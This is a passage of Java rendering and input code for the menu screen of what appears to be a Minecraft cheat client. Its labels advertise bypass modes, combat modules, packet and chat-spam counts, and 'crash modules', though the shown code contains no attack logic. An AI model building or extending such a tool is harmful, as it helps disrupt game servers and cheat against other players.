        for (int x = 0; x < W; x += 48) ctx.fill(x, 0, x + 1, H, col);
        for (int y = 0; y < H; y += 48) ctx.fill(0, y, W, y + 1, col);
    }

    private void updateDataStreams(DrawContext ctx, int W, int H) {
        for (int i = 0; i < 70; i++) {
            dsY[i] += dsSp[i];
            if (dsY[i] > H + 20) { dsY[i] = -20; dsCh[i] = rng.nextInt(DS.length()); }
            if (rng.nextInt(30) == 0) dsCh[i] = rng.nextInt(DS.length());
            if (dsY[i] < 0) continue;
            int hA = (int)(35 + 25 * glowPulse);
            ctx.drawText(textRenderer, String.valueOf(DS.charAt(dsCh[i])), (int)dsX[i] - 4, (int)dsY[i],
                (Math.min(255, hA * 2) << 24) | C_CYAN, false);
            if (dsY[i] > 14)
                ctx.drawText(textRenderer, String.valueOf(DS.charAt(dsCh[i])), (int)dsX[i] - 4, (int)dsY[i] - 14,
                    (hA << 24) | C_MUTED, false);
        }
    }

    private void updateParticles(DrawContext ctx, int W, int H) {
        for (int i = 0; i < PCNT; i++) {
            ppx[i] += pvx[i]; ppy[i] += pvy[i]; pph[i] += 0.048f;
            if (ppy[i] < -10) { ppy[i] = H + 5; ppx[i] = rng.nextFloat() * W; }
            if (ppx[i] < 0) ppx[i] = W;
            if (ppx[i] > W) ppx[i] = 0;
            float tw = (MathHelper.sin(pph[i]) + 1f) / 2f;
            int a = (int)(palp[i] * tw * 200);
            if (a < 8) continue;
            boolean big = psz[i] > 1.8f;
            int col = switch (pct[i]) {
                case 1 -> (a << 24) | (big ? C_PURPLE : 0x220033);
                case 2 -> (a << 24) | (big ? C_GOLD   : 0x443300);
                case 3 -> (a << 24) | (big ? C_RED    : 0x330000);
                default -> (a << 24) | (big ? C_CYAN  : 0x004455);
            };
            int sz = psz[i] > 2f ? 2 : 1;
            ctx.fill((int)ppx[i], (int)ppy[i], (int)ppx[i] + sz, (int)ppy[i] + sz, col);
        }
    }

    private void drawCenterGlow(DrawContext ctx, int cx, int cy) {
        int[] r = {310, 220, 145, 82};
        int[] a = {4, 8, 13, 20};
        int glowCol = tab == 4 ? C_RED : C_CYAN;
        for (int i = 0; i < 4; i++) {
            int ra = r[i], aa = (int)(a[i] * (0.5f + 0.5f * glowPulse));
            ctx.fill(cx - ra, cy - ra / 2, cx + ra, cy + ra / 2, (aa << 24) | glowCol);
        }
    }

    private void updateTrail(int mx, int my) {
        trail.addFirst(new int[]{mx, my, 0});
        if (trail.size() > 22) trail.removeLast();
        for (int[] p : trail) p[2]++;
    }

    private void drawTrail(DrawContext ctx) {
        for (int[] p : trail) {
            int age = p[2];
            if (age == 0) continue;
            int a = Math.max(0, 210 - age * 11);
            if (a <= 0) continue;
            int r = 2 + age / 3;
            int col = age < 10 ? (a << 24) | C_CYAN : (a << 24) | C_PURPLE;
            ctx.fill(p[0] - r, p[1] - 1, p[0] + r, p[1] + 1, col);
            ctx.fill(p[0] - 1, p[1] - r, p[0] + 1, p[1] + r, col);
        }
    }

    private void drawCursorGlow(DrawContext ctx, int mx, int my) {
        int[] rad = {24, 14, 6};
        int[] alp = {10, 28, 65};
        for (int i = 0; i < 3; i++) {
            int r = rad[i], a = (int)(alp[i] * (0.65f + 0.35f * glowPulse));
            ctx.fill(mx - r, my - 1, mx + r, my + 1, (a << 24) | C_CYAN);
            ctx.fill(mx - 1, my - r, mx + 1, my + r, (a << 24) | C_CYAN);
        }
        ctx.fill(mx - 2, my - 2, mx + 2, my + 2, 0xCC000000 | C_CYAN);
    }

    private void drawCorners(DrawContext ctx, int bpx, int bpy, int c) {
        int s = 16;
        ctx.fill(bpx,       bpy,       bpx + s,  bpy + 2,  c); ctx.fill(bpx,       bpy,       bpx + 2,  bpy + s,  c);
        ctx.fill(bpx+PW-s,  bpy,       bpx + PW, bpy + 2,  c); ctx.fill(bpx+PW-2,  bpy,       bpx + PW, bpy + s,  c);
        ctx.fill(bpx,       bpy+PH-2,  bpx + s,  bpy + PH, c); ctx.fill(bpx,       bpy+PH-s,  bpx + 2,  bpy + PH, c);
        ctx.fill(bpx+PW-s,  bpy+PH-2,  bpx + PW, bpy + PH, c); ctx.fill(bpx+PW-2,  bpy+PH-s,  bpx + PW, bpy + PH, c);
    }

    private void drawTitle(DrawContext ctx, int cx, int bpy, int r, int g, int b) {
        float p = (float)((Math.sin(tick * 0.055) + 1.0) / 2.0);
        int col = 0xFF000000
            | (Math.min(255, (int)(r * 0.3f + p * r * 0.7f)) << 16)
            | (Math.min(255, (int)(g * 0.4f + p * g * 0.6f)) << 8)
            |  Math.min(255, (int)(b * 0.4f + p * b * 0.6f));
        String t = "PROFESSOR CLIENT";
        int tw = textRenderer.getWidth(t);
        int gA = (int)(22 + 18 * glowPulse);
        for (int dx = -4; dx <= 4; dx++) {
            int g2 = Math.max(0, gA - Math.abs(dx) * 8);
            if (g2 > 0) {
                ctx.drawText(textRenderer, t, cx - tw/2 + dx, bpy + 14, (g2 << 24) | C_CYAN, false);
                ctx.drawText(textRenderer, t, cx - tw/2,     bpy + 14 + dx, (g2 << 24) | C_CYAN, false);
            }
        }
        ctx.drawText(textRenderer, t, cx - tw/2, bpy + 14, col, false);

        String sub = "v2.0  |  5 Modules  |  8 Bypass Modes  |  Elite";
        int sA = (int)(120 + 60 * glowPulse);
        ctx.drawText(textRenderer, sub, cx - textRenderer.getWidth(sub) / 2, bpy + 25, (sA << 24) | C_PURPLE, false);

        String dot = "* ACTIVE" + (tick % 30 < 15 ? ".." : ".");
        int dotA = (int)(80 + 80 * glowPulse);
        ctx.drawText(textRenderer, dot, cx - textRenderer.getWidth("* ACTIVE...")/2, bpy + 37, (dotA << 24) | C_CYAN, false);
    }

    private void drawTabLabels(DrawContext ctx, int cx, int bpy, int bpx, int soff, int bc) {
        switch (tab) {
            case 0 -> {
                ctx.drawText(textRenderer, "Packet Count:", cx - textRenderer.getWidth("Packet Count:") / 2, bpy + 80 + soff, 0x9900F5FF, false);
                ctx.drawText(textRenderer, "Presets:", cx - 88, bpy + 100 + soff, 0x7700AADD, false);
            }
            case 1 -> { String h = "COMBAT MODULES"; ctx.drawText(textRenderer, h, cx - textRenderer.getWidth(h)/2, bpy + 57, 0xFF003355, false); }
            case 2 -> { String h = "MOVEMENT MODULES"; ctx.drawText(textRenderer, h, cx - textRenderer.getWidth(h)/2, bpy + 57, 0xFF003355, false); }
            case 3 -> {
                ctx.drawText(textRenderer, "Message:", bpx + 14, bpy + 80 + soff, 0x7700AADD, false);
                ctx.drawText(textRenderer, "Count:", bpx + 14, bpy + 100 + soff, 0x7700AADD, false);
            }
            case 4 -> {
                String h = "!! CRASH MODULES !!";
                int hA = (int)(180 + 75 * glowPulse);
                ctx.drawText(textRenderer, h, cx - textRenderer.getWidth(h)/2, bpy + 50, (hA << 24) | C_RED, false);
            }
        }
    }

    private void drawStatus(DrawContext ctx, int cx, int bpx, int bpy) {
        if (statusTimer <= 0 || statusText.isEmpty()) return;
        int a = Math.min(255, statusTimer * 2);
        int col = (statusColor & 0x00FFFFFF) | (a << 24);
        ctx.fill(bpx + 6, bpy+PH-24, bpx+PW-6, bpy+PH-5, 0x88000000);
        ctx.fill(bpx + 6, bpy+PH-24, bpx + 8,  bpy+PH-5, (a << 24) | C_GOLD);
        ctx.fill(bpx+PW-8, bpy+PH-24, bpx+PW-6, bpy+PH-5, (a << 24) | C_GOLD);
        ctx.drawText(textRenderer, statusText, cx - textRenderer.getWidth(statusText)/2, bpy+PH-18, col, false);
    }

    private void drawMusicBar(DrawContext ctx, int bpx, int bpy) {
        boolean playing = ProfessorMusicManager.isPlaying(client);
        float prog = ProfessorMusicManager.getVisualProgress();
        int barX = bpx + 10, barY = bpy + PH - 38, barW = PW - 20, barH = 3;
        ctx.fill(barX, barY, barX + barW, barY + barH, 0x220000FF);
        int fillW = (int)(barW * prog);
        if (fillW > 0) {
            for (int xi = 0; xi < fillW; xi++) {
                float frac = (float)xi / barW;
                int r2 = (int)(frac * 155);
                int g2 = Math.max(0, (int)(245 - 245 * frac));
                ctx.fill(barX + xi, barY, barX + xi + 1, barY + barH, 0xFF000000 | (r2 << 16) | (g2 << 8) | 255);
            }
        }
        String lbl = playing ? "+ MUSIC  PLAYING" : "+ MUSIC  PAUSED";
        int lA = (int)(85 + 45 * glowPulse);
        ctx.drawText(textRenderer, lbl, barX, barY - 9, (lA << 24) | (playing ? C_CYAN : C_MUTED), false);
    }

    // ── Utility ───────────────────────────────────────────────────────────
    private float easeOut(float t) { return 1f - (1f - t) * (1f - t); }

    // ── Input ─────────────────────────────────────────────────────────────
    @Override public boolean keyPressed(int kc, int sc, int m) {
        if (pktField  != null && pktField.isFocused()  && pktField.keyPressed(kc, sc, m))  return true;
        if (chatField != null && chatField.isFocused() && chatField.keyPressed(kc, sc, m)) return true;
        if (cntField  != null && cntField.isFocused()  && cntField.keyPressed(kc, sc, m))  return true;
        return super.keyPressed(kc, sc, m);
    }
    @Override public boolean charTyped(char c, int m) {
        if (pktField  != null && pktField.isFocused())  return pktField.charTyped(c, m);
        if (chatField != null && chatField.isFocused()) return chatField.charTyped(c, m);
        if (cntField  != null && cntField.isFocused())  return cntField.charTyped(c, m);
        return super.charTyped(c, m);
    }
    @Override public boolean mouseClicked(double mx, double my, int b) {
        if (pktField  != null) pktField.mouseClicked(mx, my, b);
        if (chatField != null) chatField.mouseClicked(mx, my, b);
        if (cntField  != null) cntField.mouseClicked(mx, my, b);
        return super.mouseClicked(mx, my, b);
    }

    @Override public boolean shouldPause()      { return false; }
    @Override public boolean shouldCloseOnEsc() { return true;  }
}
